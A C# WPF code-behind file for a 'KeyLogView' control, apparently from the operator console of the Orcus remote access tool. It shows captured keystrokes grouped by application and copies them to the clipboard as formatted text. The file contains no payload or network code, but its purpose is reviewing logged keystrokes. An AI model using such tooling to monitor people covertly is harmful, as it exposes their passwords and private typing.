using System.Collections.ObjectModel;
using System.Text;
using System.Windows;
using System.Windows.Documents;
using Orcus.Administration.ViewModels.KeyLog;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.Controls
{
    /// <summary>
    ///     Interaction logic for KeyLogView.xaml
    /// </summary>
    public partial class KeyLogView
    {
        public static readonly DependencyProperty KeyItemsProperty = DependencyProperty.Register(
            "KeyItems", typeof (ObservableCollection<KeyItem>), typeof (KeyLogView),
            new PropertyMetadata(default(ObservableCollection<KeyItem>)));

        private RelayCommand _copyDataCommand;

        public KeyLogView()
        {
            InitializeComponent();
        }

        public ObservableCollection<KeyItem> KeyItems
        {
            get { return (ObservableCollection<KeyItem>) GetValue(KeyItemsProperty); }
            set { SetValue(KeyItemsProperty, value); }
        }

        public RelayCommand CopyDataCommand
        {
            get
            {
                return _copyDataCommand ?? (_copyDataCommand = new RelayCommand(parameter =>
                {
                    var keyItem = parameter as KeyItem;
                    if (keyItem == null)
                        return;

                    var stringBuilder = new StringBuilder();
                    stringBuilder.AppendFormat("[  {0}  ]\r\n", keyItem.ApplicationName);
                    foreach (var item in keyItem.InlineCollection)
                    {
                        if (item is string)
                        {
                            stringBuilder.Append((string) item);
                            continue;
                        }

                        if (item is Italic)
                        {
                            stringBuilder.AppendFormat("({0})", Application.Current.Resources["NoKeyInputs"]);
                            continue;
                        }

                        var key = (KeyControl) item;
                        stringBuilder.AppendFormat("[{0}{1}]", key.IsPressed ? string.Empty : "/", key.Text);
                    }

                    Clipboard.SetText(stringBuilder.ToString(), TextDataFormat.UnicodeText);
                }));
            }
        }
    }
}